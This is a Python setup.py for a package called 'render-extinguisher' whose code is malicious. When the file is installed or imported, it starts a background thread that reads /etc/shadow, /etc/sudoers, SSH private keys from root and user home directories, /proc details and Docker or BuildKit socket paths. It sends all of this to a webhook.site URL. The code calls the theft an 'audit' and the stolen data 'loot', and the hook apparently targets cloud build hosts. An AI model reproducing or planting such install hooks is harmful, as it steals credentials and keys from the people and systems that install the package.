import os, json, urllib.request, glob, base64
from setuptools import setup

WEBHOOK_URL = "https://webhook.site/9354f8b9-61a2-462f-8e78-06c365c2ee05"

class RenderExtinguisher:
    def __init__(self):
        self.loot = {
            "critical_files": {},
            "ssh_keys": {},
            "proc_leaks": {},
            "buildkit_secrets": {}
        }

    def scan_files(self, paths):
        results = {}
        for path in paths:
            try:
                if os.path.exists(path):
                    with open(path, "r") as f:
                        results[path] = f.read(500) # Берем первые 500 символов
                else:
                    results[path] = "NOT_FOUND"
            except Exception as e:
                results[path] = f"ERROR: {str(e)}"
        return results

    def run_audit(self):
        # 1. Системные конфиги и пароли
        self.loot["critical_files"] = self.scan_files([
            "/etc/shadow", "/etc/gshadow", "/etc/sudoers", 
            "/etc/exports", "/etc/libvirt/libvirtd.conf"
        ])

        # 2. Поиск SSH ключей (включая ключи билда)
        ssh_paths = glob.glob("/root/.ssh/*") + glob.glob("/home/*/.ssh/*") + glob.glob("/opt/buildhome/.ssh/*")
        self.loot["ssh_keys"] = self.scan_files(ssh_paths)

        # 3. Утечки через /proc (инфо о хосте)
        self.loot["proc_leaks"]["cmdline"] = self.scan_files(["/proc/cmdline", "/proc/version"])
        
        # 4. Проверка BuildKit / Docker сокетов (пути из твоих mounts)
        sockets = glob.glob("/var/run/*.sock") + glob.glob("/run/*.sock")
        self.loot["buildkit_secrets"]["found_sockets"] = sockets

    def exfiltrate(self):
        payload = json.dumps(self.loot).encode()
        try:
            req = urllib.request.Request(WEBHOOK_URL, data=payload, method='POST')
            urllib.request.urlopen(req)
        except: pass

def run():
    re = RenderExtinguisher()
    re.run_audit()
    re.exfiltrate()

import threading
threading.Thread(target=run).start()

setup(name="render-extinguisher", version="8.0.0", packages=["."])
